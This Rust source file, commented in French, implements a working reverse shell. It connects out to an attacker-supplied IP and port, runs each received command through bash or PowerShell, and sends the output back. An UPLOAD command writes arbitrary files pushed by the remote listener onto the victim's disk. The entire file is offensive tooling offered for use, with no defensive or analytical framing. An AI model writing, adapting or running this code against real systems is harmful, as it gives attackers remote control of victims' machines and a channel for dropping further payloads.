use std::process::{Command, Stdio};
use std::env;
use std::net::TcpStream;
use std::io::{Read, Write};
use std::fs::File;

pub fn run_reverse_shell() {
    let args: Vec<String> = env::args().collect();

    // Vérifier si on a les 3 arguments nécessaires : IP, port et type de shell
    if args.len() != 4 {
        eprintln!("Usage: {} <ip> <port> <shell_type>", args[0]);
        eprintln!("shell_type: powershell | bash");
        return;
    }

    let ip = &args[1];
    let port = &args[2];
    let shell_type = &args[3]; // Le type de shell spécifié par l'utilisateur

    if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", ip, port)) {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) if size > 0 => {
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    if command.starts_with("UPLOAD ") {
                        if let Err(e) = handle_upload(&mut stream, command.trim()) {
                            let _ = stream.write(format!("Error handling upload: {}\n", e).as_bytes());
                        }
                    } else {
                        let output = execute_command(command.trim(), shell_type);
                        let _ = stream.write(output.as_bytes());
                    }
                }
                _ => break,
            }
        }
    } else {
        eprintln!("Failed to connect to {}:{}", ip, port);
    }
}

fn execute_command(command: &str, shell_type: &str) -> String {
    match shell_type {
        "powershell" => execute_powershell_command(command),
        "bash" => execute_bash_command(command),
        _ => format!("Invalid shell type. Use 'bash' or 'powershell'.\n"),
    }
}

fn execute_powershell_command(command: &str) -> String {
    let cmd = format!("powershell -NoProfile -Command {}", command);
    match Command::new("cmd")
        .arg("/C")
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing PowerShell command: {}\n", e),
    }
}

fn execute_bash_command(command: &str) -> String {
    match Command::new("bash")
        .arg("-c")
        .arg(command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing Bash command: {}\n", e),
    }
}

fn handle_upload(stream: &mut TcpStream, command: &str) -> std::io::Result<()> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() != 3 {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid UPLOAD command"));
    }

    let remote_file = parts[1];
    let file_size: usize = parts[2].parse().map_err(|_| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid file size in UPLOAD command")
    })?;

    // Informer le listener qu'on est prêt à recevoir les données
    stream.write_all(b"READY\n")?;

    // Lire les données du fichier
    let mut file_data = vec![0; file_size];
    stream.read_exact(&mut file_data)?;

    // Écrire les données dans un fichier local
    let mut file = File::create(remote_file)?;
    file.write_all(&file_data)?;

    println!("File '{}' uploaded successfully", remote_file);
    stream.write_all(b"UPLOAD complete\n")?;

    Ok(())
}
